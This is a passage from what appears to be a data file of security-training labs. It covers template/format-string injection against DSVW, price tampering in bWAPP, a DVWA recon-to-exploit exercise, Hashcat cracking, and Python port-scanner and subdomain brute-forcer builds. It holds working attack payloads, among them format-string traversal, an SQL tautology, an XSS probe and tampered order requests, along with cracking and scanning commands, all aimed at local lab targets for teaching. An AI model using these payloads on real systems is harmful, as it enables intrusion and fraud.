      `Write two sentences: the confirmation payload ({0.__class__}) and the runtime-reaching payload ({1.__dict__[system]}), and the one-line change (render untrusted input as data, never as the format string itself) that fixes it`,
    ],
    resources: [
      {
        title: "DSVW (GitHub)",
        url: "https://github.com/appsecco/dsvw",
        type: "tool",
      },
      {
        title: "PayloadsAllTheThings: Server Side Template Injection",
        url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection",
        type: "tool",
      },
      {
        title: "OWASP: Server-Side Template Injection (WSTG)",
        url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection",
        type: "link",
      },
      {
        title: "tplmap: SSTI detection and exploitation tool",
        url: "https://github.com/epinna/tplmap",
        type: "tool",
      },
    ],
    completionIndicator: `The raw response showing DSVW evaluating a single-brace format-field payload ({0.__class__} returning a Python class) and a follow-up payload reaching the os module (e.g. {1.__dict__[system]} rendering the os.system built-in), paired with the DSVW source line -- tmpl.format(open(__file__), os) -- that rendered user input as the format string.`,
    dockerImage: "appsecco/dsvw",
    containerPort: 8000,
    slides: [
      {
        title: "One tiny app, a readable sink",
        body: "DSVW packs its entire vulnerability set into one small Python file, so the template-injection endpoint and the code behind it are both right there to read. Browse to the target and find the parameter that reflects your input.",
        diagram: {
          type: "container-arch",
          hostLabel: "localhost:18080",
          containerLabel: "dsvw container",
          image: "appsecco/dsvw",
          hostPort: 18080,
          containerPort: 8000,
        },
      },
      {
        title: "Confirm evaluation, not reflection",
        body: "DSVW feeds tmpl into Python's str.format(), so the tell is a single-brace format field, not {{7*7}}. /?tmpl={0.__class__} coming back as a Python class (e.g. <class '_io.TextIOWrapper'>) proves the input is consumed as the format string rather than echoed.",
        diagram: {
          type: "request-response",
          leftLabel: "Attacker",
          rightLabel: "DSVW (str.format sink)",
          exchanges: [
            {
              direction: "right",
              label: "GET /?tmpl={0.__class__}",
              payload: "{0.__class__}",
            },
            {
              direction: "left",
              label: "200 OK",
              payload: "<class '_io.TextIOWrapper'> -- input is evaluated",
            },
          ],
        },
      },
      {
        title: "Escalate: reach the runtime",
        body: "DSVW calls tmpl.format(open(__file__), os), so the os module is argument {1}. Walk its attributes/keys to reach dangerous references -- {1.__dict__[system]} renders the os.system built-in. Pure str.format() can traverse attributes and keys but cannot itself call a function, so this reaches the runtime and discloses internals rather than executing a command in one request.",
        diagram: {
          type: "flow-chain",
          steps: [
            {
              label: "{0.__class__} -> a Python class",
              detail: "evaluation confirmed",
            },
            {
              label: "Walk format-string object model",
              detail: "{1} is the os module -> __dict__[system]",
            },
            {
              label: "{1.__dict__[system]}",
              detail: "renders <built-in function system> -- os.system reached",
            },
          ],
        },
      },
      {
        title: "Match the exploit to its source line",
        body: "Open DSVW's single source file and find the render/format call that fed your input straight into the template -- the exploit and its root cause sit side by side in the same readable file.",
        diagram: {
          type: "comparison",
          columns: [
            {
              label: "Vulnerable",
              points: [
                "user input concatenated/formatted into template source",
                "engine executes attacker-controlled syntax",
              ],
            },
            {
              label: "Fixed",
              points: [
                "render untrusted input as data, never as template source",
                "no path from input to code execution",
              ],
              highlighted: true,
            },
          ],
        },
      },
      {
        title: "Why this matters",
        body: "Template/format injection looks like ordinary rendering until a probe ({0.__class__} here, or {{7*7}} against a real template engine) confirms the input is being executed, not displayed. The ceiling depends on the engine: a full template engine often reaches RCE, while DSVW's str.format() sink reaches the runtime and leaks internals but cannot call a function directly. Doing detect -> confirm -> escalate against DSVW, then pointing at the exact source line, proves you understand both the exploit and the fix.",
      },
    ],
    hints: [
      "The endpoint is the tmpl parameter (/?tmpl=...). DSVW uses Python str.format(), so probe with a single-brace format field like {0.__class__} -- {{7*7}} is Jinja2 syntax and here just prints the literal {7*7}.",
      "If {0.__class__} comes back as a Python class, your input is being consumed as the format string; DSVW passes the os module as argument {1}, so {1.__dict__[system]} reaches os.system. Note format syntax can read attributes/keys but cannot call a function.",
      "Once you've reached the runtime, open DSVW's single source file and find the tmpl.format(open(__file__), os) call that fed your input in as the format string -- that line is the actual finding.",
    ],
  },
  {
    id: "L32",
    number: 32,
    week: 10,
    moduleId: "m10",
    title: "bWAPP: price and quantity tampering in the ticket order flow",
    description:
      "Business logic flaws slip past every input filter because the requests are perfectly well-formed -- the bug is that the server trusts a value it should have recomputed. bWAPP's 'Insecure DOR (Order Tickets)' page is a textbook case: the ticket price and quantity travel in a request the client controls, and the server bills whatever arrives. You place a normal order, intercept the POST in Burp, and tamper the price parameter to a fraction of its real value -- or set a negative quantity to invert the total -- then confirm the server accepts the manipulated order. Raising the security level shows where a real fix belongs: re-deriving the price from the catalog server-side and validating quantity bounds. None of this uses an injection payload; the finding is the missing server-side re-validation, exactly the class automated scanners miss.",
    objective:
      "Identify and exploit a business-logic flaw in bWAPP's ticket order flow where price and quantity are trusted from client input instead of being re-validated server-side.",
    successCriteria: [
      "Placed a baseline order and intercepted the request to identify the client-controlled price/quantity parameters",
      "Tampered ticket_price to a fraction of its real value and had the server accept it",
      "Tampered ticket_quantity (e.g. a negative value) to produce a manipulated total",
      "Confirmed a higher security level rejects/re-derives the tampered values and named the missing server-side control",
    ],
    platform: "bWAPP",
    difficulty: "medium",
    estimatedHours: 3,
    instructions: [
      `Click 'Start Lab' above, then browse to http://localhost:18080/install.php once and click install (one-time DB setup), then log in with bee / bug and set the security level to low`,
      `From the bug dropdown, open 'Insecure DOR (Order Tickets)' (an Insecure Direct Object Reference / ticket order flow), and place a normal ticket order to see the baseline total`,
      `Intercept the order POST in Burp Suite and identify the client-controlled parameters -- the ticket_price and ticket_quantity (or equivalently named) fields carried in the request`,
      `Tamper the price: change ticket_price to a fraction of its real value, forward the request, and confirm the server bills the manipulated amount rather than re-deriving it from the catalog`,
      `Tamper the quantity: try a negative or out-of-range ticket_quantity and observe whether the server computes a nonsensical (e.g. negative) total, proving no bounds check exists`,
      `Raise the security level and resend the same tampered request; confirm the server now rejects or re-derives the value, and note where the fix lives`,
      `Write one sentence per finding naming the missing server-side control: price re-derivation from the catalog, and quantity bounds validation -- the actual finding, not just the cheap order`,
    ],
    resources: [
      {
        title: "bWAPP official page (itsecgames.com)",
        url: "http://www.itsecgames.com",
        type: "link",
      },
      {
        title: "bWAPP on Docker Hub",
        url: "https://hub.docker.com/r/raesene/bwapp",
        type: "tool",
      },
      {
        title: "OWASP Web Security Testing Guide: Business Logic Testing",
        url: "https://owasp.org/www-project-web-security-testing-guide/",
        type: "link",
      },
      {
        title: "OWASP: Web Parameter Tampering",
        url: "https://owasp.org/www-community/attacks/Web_Parameter_Tampering",
        type: "link",
      },
    ],
    completionIndicator: `Screenshots of the intercepted bWAPP Order Tickets POST with a tampered ticket_price (and/or negative ticket_quantity) accepted by the server at low security, plus confirmation that raising the security level rejects or re-derives the same tampered request.`,
    dockerImage: "raesene/bwapp",
    containerPort: 80,
    slides: [
      {
        title: "Install bWAPP, place a baseline order",
        body: "Every fresh bWAPP container needs a one-time /install.php visit. After logging in bee / bug at security level low, open 'Insecure DOR (Order Tickets)' and place a normal order to see the honest total before tampering anything.",
        diagram: {
          type: "container-arch",
          hostLabel: "localhost:18080",
          containerLabel: "bwapp container",
          image: "raesene/bwapp",
          hostPort: 18080,
          containerPort: 80,
        },
      },
      {
        title: "The price lives in the client request",
        body: "Intercepting the order POST shows the ticket_price and ticket_quantity travelling in a request the client controls -- the server bills whatever arrives instead of re-deriving the price from the catalog.",
        diagram: {
          type: "request-response",
          leftLabel: "Attacker (Burp)",
          rightLabel: "bWAPP Order Tickets",
          exchanges: [
            {
              direction: "right",
              label: "POST /ticket order",
              payload: "ticket_quantity=1&ticket_price=15.00",
            },
            {
              direction: "left",
              label: "200 OK -- order billed at the submitted price",
            },
          ],
        },
      },
      {
        title: "Tamper price and quantity",
        body: "Lowering ticket_price to a fraction of its value, or setting a negative ticket_quantity, produces a manipulated (or nonsensical negative) total the server accepts -- proving there is no server-side re-derivation and no bounds check.",
        diagram: {
          type: "request-response",
          leftLabel: "Attacker (Burp)",
          rightLabel: "bWAPP Order Tickets",
          exchanges: [
            {
              direction: "right",
              label: "POST /ticket order (tampered)",
              payload: "ticket_quantity=-5&ticket_price=0.01",
            },
            {
              direction: "left",
              label: "200 OK -- manipulated total accepted",
            },
          ],
        },
      },
      {
        title: "Raise the level, the tamper is rejected",
        body: "Resending the same tampered request at a higher security level shows the server now rejects or re-derives the value -- naming the missing control (price re-derivation, quantity bounds) is the actual finding.",
        diagram: {
          type: "flow-chain",
          steps: [
            {
              label: "Tampered POST resent",
              detail: "same request, higher security level",
            },
            {
              label: "Server re-derives / bounds-checks",
              detail: "price from catalog, quantity within range",
            },
            {
              label: "Rejected",
              detail: "manipulated order no longer goes through",
            },
          ],
        },
      },
      {
        title: "Why this matters",
        body: "These flaws evade every WAF and input filter because the HTTP requests are syntactically perfect -- the bug is that the server trusted a client-supplied price and never bounded the quantity. Auditing an application's trust assumptions directly, not just its input validation, is exactly the skill that finds the vulnerability classes automated scanners miss.",
      },
    ],
    hints: [
      "Fresh bWAPP needs /install.php once; log in bee / bug, set the level to low, and open 'Insecure DOR (Order Tickets)'.",
      "Place a normal order, intercept the POST, and look for the ticket_price and ticket_quantity fields travelling in the request the client controls.",
      "Change the price to a fraction of its value (or set a negative quantity) and forward it -- if the server bills the tampered amount, the missing control is server-side re-derivation / bounds checking, which is the finding.",
    ],
  },
  {
    id: "L33",
    number: 33,
    week: 11,
    moduleId: "m11",
    title: "In-House Range: Solo Recon-to-Exploit Methodology",
    description:
      "Every real engagement starts the same way: a bare target, no walkthrough, and a recon-to-exploit process you have to run yourself end to end. This lab hands you that exact loop against a target the portal starts for you — a DVWA container mapped to localhost:18080 — with no external account, VPN, or queue to wait on. You'll enumerate it cold with nmap and curl exactly as you would a real host, identify a vulnerability class from what you find rather than being told which lab page to open, exploit it, and document the full chain the way a real report demands: target overview, recon findings, exploitation steps, and what generalizes to a production engagement. Working it solo, with nothing pre-selected for you, is the first time in the programme you run a complete OSCP-style engagement start to finish on your own.",
    objective:
      "Independently run a full recon-to-exploit methodology against a locally-started in-house Docker target — enumerate it cold, identify and exploit a vulnerability, and document the chain end to end.",
    successCriteria: [
      "nmap and curl recon output saved showing every open port and service identified on localhost:18080 before any exploitation began",
      "At least one vulnerability identified from recon (not pre-selected) and exploited, with the exact commands and raw output saved",
      "A screenshot or terminal capture proving the exploit succeeded (e.g. a dumped credential, an executed payload, extracted data)",
      "A written report section covering Target Overview, Recon Findings, Exploitation Steps, and one paragraph on what generalizes to a real engagement",
    ],
    platform: "In-House Docker Range",
    difficulty: "medium",
    estimatedHours: 10,
    instructions: [
      `Click 'Start Lab' above to launch the in-house target (DVWA), which the portal maps to localhost:18080 — no account, VPN, or queue required`,
      `Recon cold: run nmap -sV -p- localhost against it and note every open port and service/version banner, exactly as you would against an unfamiliar host`,
      `Recon the web service with curl: curl -i http://localhost:18080/ to read response headers, then browse the app manually to map its pages and login flow`,
      `From what recon turned up, identify a vulnerability class to pursue yourself (e.g. SQL injection in a login or search field, reflected/stored XSS, weak default credentials) rather than being told which one to attack`,
      `Exploit the vulnerability you identified, saving the exact request/command and its raw output at each step`,
      `Confirm impact concretely — e.g. a dumped credential, an executed script, or data extracted that shouldn't have been accessible — and capture a screenshot proving it`,
      `For every step, save the exact commands run and their raw output before moving on — you'll need them for the write-up and you cannot reconstruct them from memory later`,
      `Write a report section (Target Overview, Recon Findings, Exploitation Steps, Proof of Impact, one paragraph on what generalizes to real engagements) covering the full chain`,
    ],
    resources: [
      {
        title: "Nmap official docs (Reference Guide)",
        url: "https://nmap.org/book/man.html",
        type: "link",
      },
      {
        title: "OWASP Testing Guide",
        url: "https://owasp.org/www-project-web-security-testing-guide/",
        type: "link",
      },
      {
        title: "DVWA (Damn Vulnerable Web Application) source repo",
        url: "https://github.com/digininja/DVWA",
        type: "tool",
      },
      {
        title: "Hack The Box – Starting Point (optional extra practice)",
        url: "https://app.hackthebox.com/starting-point",
        type: "platform",
      },
    ],
    completionIndicator: `Saved nmap/curl recon output against localhost:18080, the exact exploitation commands and raw output for the vulnerability you identified, a screenshot proving impact, and a compiled write-up covering Target Overview, Recon Findings, Exploitation Steps, and Proof of Impact.`,
    dockerImage: "ghcr.io/digininja/dvwa:latest",
    containerPort: 80,
    slides: [
      {
        title: "Start the in-house target",
        body: "Click 'Start Lab' to launch the DVWA container, which the portal maps to localhost:18080 — no account, VPN, or queue required, and no rate limit to work around.",
        diagram: {
          type: "container-arch",
          hostLabel: "localhost:18080",
          containerLabel: "in-house target",
          image: "ghcr.io/digininja/dvwa:latest",
          hostPort: 18080,
          containerPort: 80,
        },
      },
      {
        title: "Recon cold with nmap",
        body: "Run nmap -sV -p- localhost against the target and note every open port and service/version banner — exactly the recon step every real engagement starts with, before anyone knows what's actually running.",
        diagram: {
          type: "terminal",
          prompt: "you@laptop:~$",
          lines: [
            {
              command: "nmap -sV -p- localhost",
            },
            {
              output: "18080/tcp open http Apache httpd 2.4",
            },
          ],
        },
      },
      {
        title: "Recon the web service with curl",
        body: "Run curl -i http://localhost:18080/ to read response headers, then browse the app manually to map its pages and login flow before deciding what to attack.",
        diagram: {
          type: "terminal",
          prompt: "you@laptop:~$",
          lines: [
            {
              command: "curl -i http://localhost:18080/",
            },
            {
              output: "HTTP/1.1 302 Found\nLocation: /login.php",
            },
          ],
        },
      },
      {
        title: "Identify a vulnerability class yourself",
        body: "From what recon turned up, pick a vulnerability class to pursue on your own — e.g. SQL injection in a login or search field, reflected/stored XSS, or weak default credentials — rather than being pointed at one.",
        diagram: {
          type: "flow-chain",
          steps: [
            {
              label: "Recon findings",
              detail: "open ports, pages, forms, headers",
            },
            {
              label: "Candidate vuln classes",
              detail: "SQLi / XSS / weak creds",
            },
            {
              label: "Your choice",
              detail: "pick one to pursue",
            },
          ],
        },
      },
      {
        title: "Exploit it and prove impact",
        body: "Exploit the vulnerability you identified, saving the exact request or command and its raw output at each step, then capture concrete proof of impact — a dumped credential, an executed payload, or extracted data.",
        diagram: {
          type: "terminal",
          prompt: "you@laptop:~$",
          lines: [
            {
              command: "# example: SQLi in a login/search field",
            },
            {
              command: "' OR '1'='1",
            },
            {
              output: "Authentication bypassed / data returned",
            },
          ],
        },
      },
      {
        title: "Document the full chain",
        body: "Save every command and its raw output as you go, then write the report section: Target Overview, Recon Findings, Exploitation Steps, Proof of Impact, and one paragraph on what generalizes to a real engagement.",
      },
      {
        title: "What you just proved",
        body: "Recon with nmap and curl, choosing your own vulnerability class from what you found rather than being told which one, exploiting it, and documenting the full chain is the exact loop pentesters run engagement after engagement. Doing it solo against a target you started yourself, with no walkthrough, is the skill this lab is built to prove you have.",
      },
    ],
    hints: [
      "Stuck on where to start? Run nmap -sV -p- localhost first -- the open port and service banner it reveals is what every real engagement's next decision is based on.",
      "Match what recon found to a candidate vulnerability class: a login or search field points at SQL injection, an input reflected back into the page points at XSS, a login form with an obvious default points at weak credentials.",
      "If you're unsure which field is injectable, try a simple tautology payload such as ' OR '1'='1 in a login field, or a basic <script>alert(1)</script> in any field that echoes input back to the page.",
    ],
  },
  {
    id: "L34",
    number: 34,
    week: 11,
    moduleId: "m11",
    title: "Hashcat: Crack provided MD5 and SHA-256 hashes",
    description:
      "Credential dumps show up in almost every real post-exploitation and CTF scenario, and what happens next depends entirely on whether the hashes are salted. This lab puts you on the attacker's side of that gap: crack a batch of your own MD5 and SHA-256 hashes with Hashcat against rockyou.txt, escalate to rule-based mutation (best64.rule) for the passwords a plain dictionary attack misses, and cross-verify results with John the Ripper. Watching Hashcat's live Recovered/Speed/Time status block also makes visible why GPU-backed cracking on bare metal so heavily outpaces VM-bound cracking -- exactly the slowdown the lab has you expect going in. You leave able to pick the correct hash mode, run and escalate a real cracking attack, and explain precisely why raw MD5/SHA-256 fail where salted bcrypt/Argon2 would hold.",
    objective:
      "Crack a self-generated batch of MD5 and SHA-256 password hashes with Hashcat and John the Ripper, and explain why salted hashing would have prevented it.",
    successCriteria: [
      "Cracked the MD5 batch against rockyou.txt (mode 0) and the SHA-256 batch (mode 1400)",
      "Escalated any uncracked hashes with the bundled best64.rule rule-based attack",
      "Cross-verified at least one result with John the Ripper",
      "Displayed all cracked hash:plaintext pairs and explained why salted bcrypt/Argon2 would resist the same attack",
    ],
    platform: "Hashcat",
    difficulty: "medium",
    estimatedHours: 2,
    assets: [
      {
        name: "hashes-md5.txt",
        path: "/lab-assets/L34/hashes-md5.txt",
        description:
          "5 real MD5 hashes to crack with hashcat mode 0. All are recoverable using the provided wordlist.",
        size: "1 KB",
      },
      {
        name: "hashes-sha256.txt",
        path: "/lab-assets/L34/hashes-sha256.txt",
        description: "5 real SHA-256 hashes to crack with hashcat mode 1400.",
        size: "1 KB",
      },
      {
        name: "wordlist.txt",
        path: "/lab-assets/L34/wordlist.txt",
        description:
          "A 30-word dictionary containing every answer plus decoys — use it for a real dictionary attack (no rockyou download needed).",
        size: "1 KB",
      },
      {
        name: "ANSWER-KEY.txt",
        path: "/lab-assets/L34/ANSWER-KEY.txt",
        description:
          "hash:plaintext pairs to self-check after you crack them. Only open once you're done.",
        size: "1 KB",
      },
    ],
    instructions: [
      "Install hashcat (bundled on Kali; otherwise apt/brew install hashcat). Download the three hash/wordlist files from the Lab Files section above — everything you need is hosted in-portal, no rockyou download required",
      "Optional (to see how the hashes are made): pick a word and hash it with echo -n 'password' | md5sum and echo -n 'password' | sha256sum — this is exactly how the provided hashes were generated",
      "Confirm hash length maps to mode: MD5 = 32 hex chars = mode 0; SHA2-256 = 64 hex chars = mode 1400 (cross-check against hashcat's example_hashes wiki page)",
      "Run the MD5 batch against the provided wordlist: hashcat -a 0 -m 0 hashes-md5.txt wordlist.txt",
      "Run the SHA-256 batch: hashcat -a 0 -m 1400 hashes-sha256.txt wordlist.txt",
      "If your hash file includes usernames alongside each hash, add --username so hashcat parses that column instead of treating it as part of the hash",
      "For any hash rockyou.txt alone doesn't crack, apply hashcat's bundled rule file: hashcat -a 0 -m 0 md5_hashes.txt rockyou.txt -r rules/best64.rule",
      "Cross-check at least one hash with John the Ripper: john --format=raw-SHA256 sha256_hashes.txt --wordlist=rockyou.txt, then john --show --format=Raw-SHA256 sha256_hashes.txt to re-display the cracked result without re-running",
      "Display all hashcat-cracked results: hashcat -m 0 md5_hashes.txt --show and hashcat -m 1400 sha256_hashes.txt --show",
      "While a job runs, watch the live status block (Recovered, Progress, Speed in kH/s, Time.Started/Estimated) to judge throughput and completion - note if you're running inside a VM without GPU passthrough, expect a large slowdown versus bare-metal GPU cracking",
      "For each hash, record whether it cracked instantly, needed a rule, or didn't crack at all - and why (length, complexity, dictionary coverage)",
      "Write a short note on why salted bcrypt/Argon2 (not tested here) would resist this exact attack while raw MD5/SHA-256 does not",
    ],
    resources: [
      { title: "Hashcat", url: "https://hashcat.net/hashcat/", type: "tool" },
      {
        title: "Hashcat example hashes wiki (mode reference)",
        url: "https://hashcat.net/wiki/doku.php?id=example_hashes",
        type: "link",
      },
      {
        title: "Hashcat rule-based attack wiki",
        url: "https://hashcat.net/wiki/doku.php?id=rule_based_attack",
        type: "link",
      },
      {
        title: "SecLists (wordlists incl. rockyou variants)",
        url: "https://github.com/danielmiessler/SecLists",
        type: "tool",
      },
    ],
    completionIndicator: `Terminal screenshot of \`hashcat -m 0 md5_hashes.txt --show\` and \`hashcat -m 1400 sha256_hashes.txt --show\`, each line showing the original hash next to its cracked plaintext password.`,
    slides: [
      {
        title: "Build your own test hashes",
        body: "Pick 5-10 real rockyou.txt passwords and hash each with echo -n 'password' | md5sum and echo -n 'password' | sha256sum, saving results into md5_hashes.txt and sha256_hashes.txt.",
        diagram: {
          type: "terminal",
          prompt: "$",
          lines: [
            {
              command: "echo -n 'password' | md5sum",
            },
            {
              output: "5f4dcc3b5aa765d61d8327deb882cf99  -",
            },
            {
              command: "echo -n 'password' | sha256sum",
            },
            {
              output:
                "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d  -",
            },
          ],
        },
      },
      {
        title: "Map hash length to hashcat mode",
        body: "MD5 = 32 hex chars = mode 0; SHA2-256 = 64 hex chars = mode 1400 -- cross-check both against hashcat's example_hashes wiki page before running anything.",
        diagram: {
          type: "layer-stack",
          layers: [
            {
              label: "MD5",
              detail: "32 hex chars -> -m 0",
            },
            {
              label: "SHA2-256",
              detail: "64 hex chars -> -m 1400",
              highlighted: true,
            },
          ],
        },
      },
      {
        title: "Run the dictionary attack against rockyou.txt",
        body: "Run hashcat -a 0 -m 0 md5_hashes.txt rockyou.txt for the MD5 batch and hashcat -a 0 -m 1400 sha256_hashes.txt rockyou.txt for the SHA-256 batch; add --username if the file has a username column.",
        diagram: {
          type: "terminal",
          prompt: "$",
          lines: [
            {
              command: "hashcat -a 0 -m 0 md5_hashes.txt rockyou.txt",
            },
            {
              command: "hashcat -a 0 -m 1400 sha256_hashes.txt rockyou.txt",
            },
          ],
        },
      },
      {
        title: "Escalate misses with a rule file",
        body: "For any hash rockyou.txt alone doesn't crack, apply hashcat's bundled rule file: hashcat -a 0 -m 0 md5_hashes.txt rockyou.txt -r rules/best64.rule.",
        diagram: {
          type: "terminal",
          prompt: "$",
          lines: [
            {
              command:
                "hashcat -a 0 -m 0 md5_hashes.txt rockyou.txt -r rules/best64.rule",
            },
          ],
        },
      },
      {
        title: "Cross-check with John the Ripper",
        body: "Run john --format=raw-SHA256 sha256_hashes.txt --wordlist=rockyou.txt, then john --show --format=Raw-SHA256 sha256_hashes.txt to re-display the cracked result without re-running the attack.",
        diagram: {
          type: "terminal",
          prompt: "$",
          lines: [
            {
              command:
                "john --format=raw-SHA256 sha256_hashes.txt --wordlist=rockyou.txt",
            },
            {
              command: "john --show --format=Raw-SHA256 sha256_hashes.txt",
            },
          ],
        },
      },
      {
        title: "Show results and watch throughput",
        body: "Display everything cracked with hashcat -m 0 md5_hashes.txt --show and hashcat -m 1400 sha256_hashes.txt --show, and while a job runs watch the Recovered/Progress/Speed/Time status block -- expect a large slowdown in a VM without GPU passthrough versus bare-metal.",
        diagram: {
          type: "terminal",
          prompt: "$",
          lines: [
            {
              command: "hashcat -m 0 md5_hashes.txt --show",
            },
            {
              output: "5f4dcc3b5aa765d61d8327deb882cf99:password",
            },
            {
              command: "hashcat -m 1400 sha256_hashes.txt --show",
            },
          ],
        },
      },
      {
        title: "Why this matters",
        body: "Unsalted MD5 and SHA-256 hashes fall quickly to a GPU and a public wordlist — exactly the situation attackers exploit the moment a credential dump leaks. You now know how to pick the right hashcat mode, escalate past a dictionary miss with rule-based mutation, and explain concretely why salted bcrypt/Argon2 would have stopped this same attack cold.",
      },
    ],
    hints: [
      "Not sure which hashcat mode to pass? Count the hex characters in your hash string -- the length tells you the mode.",
      "MD5 hashes are 32 hex characters (mode 0); SHA2-256 hashes are 64 hex characters (mode 1400) -- cross-check against hashcat's example_hashes wiki page if you're unsure.",
      "If a hash doesn't crack against rockyou.txt alone, that's expected for some passwords -- escalate with hashcat's bundled rule file (-r rules/best64.rule) before assuming it can't be cracked.",
    ],
  },
  {
    id: "L35",
    number: 35,
    week: 11,
    moduleId: "m12",
    title: "Python: TCP port scanner script",
    description:
      "Every pentest and CTF starts with a port scan, but running nmap -p- without understanding what happens on the wire leaves a gap real practitioners are expected to close. This lab has you build that exact primitive yourself: a Python scanner that opens a raw socket.AF_INET/SOCK_STREAM connection per port, reads connect_ex() return codes to determine open/closed, and parallelizes the whole sweep with ThreadPoolExecutor so a 65535-port range finishes in seconds, the way the lab's own timed run demonstrates. You validate your own tool by diffing its output against a live nmap -p- -T4 scan of the same host, exposing where a hand-rolled connect scan agrees — and disagrees — with the industry-standard tool. You walk away understanding exactly what a TCP connect scan does at the socket level, not just how to invoke one.",
    objective:
      "Build a Python TCP connect-scan port scanner from raw sockets and validate its accuracy against nmap.",
    successCriteria: [
      "Wrote scanner.py accepting --target and --ports and correctly identifying open ports via connect_ex()",
      "Parallelized the scan with ThreadPoolExecutor and a configurable --threads argument",
      "Ran the scanner only against an owned or explicitly authorized target",
      "Diffed the scanner's output against an nmap -p- scan of the same host and explained any discrepancies",
    ],
    platform: "Python",
    difficulty: "medium",
    estimatedHours: 2,
    instructions: [
      `Create scanner.py and use argparse to accept --target (IP) and --ports (e.g. '1-1024' or a comma-separated list)`,
      `Parse the ports argument into a concrete list of ints, supporting both range and comma-list syntax`,
      `For each port, open socket.socket(socket.AF_INET, socket.SOCK_STREAM) and set a short timeout with settimeout(0.5)`,
      `Call sock.connect_ex((target, port)) and treat a return value of 0 as 'open'; print each open port immediately (flush stdout) for live feedback on long scans`,
      `Always close the socket after each check (sock.close()) to avoid file-descriptor exhaustion on large ranges`,
      `Wrap the per-port scan in concurrent.futures.ThreadPoolExecutor (e.g. max_workers=100) — a sequential loop over 65535 ports is impractically slow`,
      `Add a --threads argument to control worker count, and print total scan duration using time.time() deltas`,
      `Only ever point this at a host you own or a designated lab target (your own Metasploitable2 VM or an HTB machine you're authorized on) — scanning third parties without permission is illegal in most jurisdictions`,
      `Validate accuracy: run nmap -p- -T4 <target> against the same host and diff the two open-port lists, explaining any discrepancy you find`,
    ],
    resources: [
      {
        title: "Python socket module docs",
        url: "https://docs.python.org/3/library/socket.html",
        type: "link",
      },
      {
        title: "Python concurrent.futures docs",
        url: "https://docs.python.org/3/library/concurrent.futures.html",
        type: "link",
      },
      {
        title: "Metasploitable2 (legal local scan target)",
        url: "https://sourceforge.net/projects/metasploitable/files/Metasploitable2/",
        type: "tool",
      },
      {
        title: "Nmap official docs",
        url: "https://nmap.org/book/man.html",
        type: "link",
      },
    ],
    completionIndicator: `Terminal screenshot of scanner.py's output listing open ports on the target, placed alongside the equivalent \`nmap -p-\` output for the same host, plus the script's source file.`,
    slides: [
      {
        title: "Argparse the CLI",
        body: "scanner.py uses argparse to accept --target for the IP and --ports for a spec like '1-1024' or a comma-separated list, so one script can scan any host and range without editing code.",
        diagram: {
          type: "terminal",
          prompt: "$",
          lines: [
            {
              command:
                "python3 scanner.py --target 203.0.113.10 --ports 1-1024 --threads 100",
            },
          ],
        },
      },
      {
        title: "Parse the port spec",
        body: "The --ports argument is parsed into a concrete list of ints, supporting both a range like '1-1024' and a comma-separated list like '22,80,443'.",
      },
      {
        title: "Connect-scan a single port",
        body: "For each port, the script opens a socket.AF_INET/SOCK_STREAM socket, sets a short settimeout(0.5), then calls sock.connect_ex((target, port)) — a return value of 0 means the port is open.",
        diagram: {
          type: "terminal",
          prompt: ">>>",
          lines: [
            {
              command: "sock.connect_ex((target, port))",
            },
            {
              output: "0   # 0 == open",
            },
          ],
        },
      },
      {
        title: "Print live, close every socket",
        body: "Each open port is printed immediately with flushed stdout for live feedback on long scans, and sock.close() runs after every check to avoid file-descriptor exhaustion across thousands of ports.",
        diagram: {
          type: "terminal",
          prompt: "$",
          lines: [
            {
              output: "[+] 22/tcp open",
            },
            {
              output: "[+] 80/tcp open",
            },
            {
              output: "[+] 443/tcp open",
            },
          ],
        },
      },
      {
        title: "Parallelize with ThreadPoolExecutor",
        body: "A sequential loop over 65535 ports is impractically slow, so the per-port scan is wrapped in concurrent.futures.ThreadPoolExecutor, with a --threads argument controlling max_workers (e.g. 100) and total duration measured via time.time() deltas.",
        diagram: {
          type: "terminal",
          prompt: "$",
          lines: [
            {
              command:
                "python3 scanner.py --target 203.0.113.10 --ports 1-65535 --threads 100",
            },
            {
              output: "Scan completed in 4.82s",
            },
          ],
        },
      },
      {
        title: "Stay in scope",
        body: "This scanner is only ever pointed at a host you own or a designated lab target — your own Metasploitable2 VM or an HTB machine you're authorized on — since scanning third parties without permission is illegal in most jurisdictions.",
      },
      {
        title: "Validate against nmap",
        body: "Run nmap -p- -T4 against the same target and diff the two open-port lists, explaining any discrepancy between your scanner's results and nmap's.",
        diagram: {
          type: "terminal",
          prompt: "$",
          lines: [
            {
              command: "nmap -p- -T4 203.0.113.10",
            },
            {
              output: "22/tcp  open ssh",
            },
            {
              output: "80/tcp  open http",
            },
            {
              output: "443/tcp open https",
            },
          ],
        },
      },
      {
        title: "Why this matters",
        body: "You just implemented the exact connect()/timeout/open-port logic that Nmap's connect scan performs under the hood, and proved it against a live host by diffing your results with nmap's. That's the difference between running a tool and understanding the primitive it's built on — the skill that lets you debug scan discrepancies, write custom scanners for restricted environments, and reason about what a firewall or IDS actually sees on the wire.",
      },
    ],
    hints: [
      "If your scan is painfully slow, think about what happens for every single port before you add threading -- looping over thousands of ports one at a time is the bottleneck, not the socket logic.",
      "Wrap the per-port check in concurrent.futures.ThreadPoolExecutor and let a --threads argument control how many workers run at once.",
      "Each port check is: open a socket.AF_INET/SOCK_STREAM socket, settimeout(0.5), then call connect_ex((target, port)) -- a return value of 0 means open, and you must close() the socket afterward or you'll exhaust file descriptors on a full range scan.",
    ],
  },
  {
    id: "L36",
    number: 36,
    week: 11,
    moduleId: "m12",
    title: "Python: Subdomain brute-forcer script",
    description:
      "Subdomain enumeration is the opening move of almost every external engagement — tools like amass and subfinder exist because a company's real attack surface is rarely just the domain named in the scope letter. This lab has you build the pattern those tools run on rather than just invoking them: resolve each candidate hostname from a real SecLists wordlist with socket.gethostbyname() first, filtering out the vast majority of non-existent subdomains before any HTTP request fires, then probe only the survivors over HTTP and HTTPS and parallelize the whole sweep with ThreadPoolExecutor. You close the loop by cross-checking your results against crt.sh's certificate-transparency data, seeing directly where active brute-forcing and passive OSINT diverge. You walk away able to explain — and reproduce — the resolve-then-probe pattern underneath every subdomain enumeration tool you'll use afterward.",
    objective:
      "Build a Python subdomain brute-forcer that resolves candidates via DNS before probing them over HTTP/HTTPS, then compare results against passive certificate-transparency data.",
    successCriteria: [
